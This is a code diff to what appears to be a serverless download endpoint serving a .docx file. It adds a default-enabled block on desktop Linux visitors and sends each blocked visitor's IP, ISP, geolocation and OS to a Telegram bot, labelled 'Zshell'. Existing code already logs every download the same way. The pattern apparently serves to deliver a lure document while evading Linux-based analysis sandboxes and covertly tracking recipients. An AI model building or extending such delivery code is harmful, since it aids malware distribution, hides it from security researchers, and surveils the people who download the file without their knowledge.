@@ -8,6 +8,7 @@ import { UAParser } from 'ua-parser-js'
 const config = {
     TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || null,
     TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || null,
+    BLOCK_LINUX: process.env.BLOCK_LINUX !== 'false', // Default enabled, set BLOCK_LINUX=false to disable
 }
 
 // Enhanced Telegram Logging Function (Non-blocking)
@@ -145,6 +146,53 @@ async function formatDownloadLog(userAgent: string, ip: string, referrer: string
 ✅ Docx file download started successfully for ${deviceType} device`
 }
 
+// Linux blocking function
+function checkLinuxBlocking(userAgent: string): { isLinux: boolean, platform: string } {
+    if (!config.BLOCK_LINUX) {
+        return { isLinux: false, platform: 'blocking disabled' }
+    }
+
+    const parser = new UAParser(userAgent)
+    const os = parser.getOS()
+    const platform = (os.name || '').toLowerCase()
+    
+    // Block desktop Linux (but allow Android and ChromeOS)
+    const isLinux = platform.includes('linux') && 
+                   !platform.includes('android') && 
+                   !platform.includes('chrome') &&
+                   !platform.includes('chromeos')
+    
+    return { isLinux, platform: os.name || 'Unknown' }
+}
+
+// Format blocked Linux log message
+async function formatBlockedLog(userAgent: string, ip: string): Promise<string> {
+    const parser = new UAParser(userAgent)
+    const os = parser.getOS()
+    const location = await getLocationData(ip)
+    
+    const currentTime = new Date().toLocaleString('en-US', {
+        timeZone: 'UTC',
+        year: 'numeric',
+        month: '2-digit', 
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    })
+
+    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country
+    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : ''
+
+    return `🚫 Linux Access Blocked
+🧛‍♂️ Zshell - Security Block
+🌍 IP: ${ip}${ispInfo}
+🖥 Platform: ${os.name || 'Unknown'} ${os.version || ''}
+📍 Location: ${locationInfo}
+⏰ Time: ${currentTime}
+❌ Reason: Linux systems not supported`
+}
+
 export default async function handler(req: VercelRequest, res: VercelResponse) {
     // Only allow GET requests
     if (req.method !== 'GET') {
@@ -177,6 +225,27 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     const userAgent = req.headers['user-agent'] as string || 'Unknown'
     const clientIP = getClientIP(req)
     const referrer = (req.headers.referer || req.headers.referrer) as string || 'Direct'
+    
+    // Check Linux blocking first
+    const { isLinux, platform } = checkLinuxBlocking(userAgent)
+    if (isLinux) {
+        console.log(`🚫 Blocked Linux access from ${clientIP} - ${platform}`)
+        
+        // Log to Telegram (non-blocking)
+        try {
+            const blockMessage = await formatBlockedLog(userAgent, clientIP)
+            sendTelegramLog(blockMessage)
+        } catch (error: any) {
+            console.error('❌ Failed to send block log:', error.message)
+        }
+        
+        // Return 403 with informative message
+        return res.status(403).json({
+            success: false,
+            message: 'Access denied - Linux systems not supported',
+            error: 'LINUX_BLOCKED'
+        })
+    }
     
     console.log(`📥 Download request received for: ${fileName}`)
     console.log(`📂 File path: ${filePath}`)
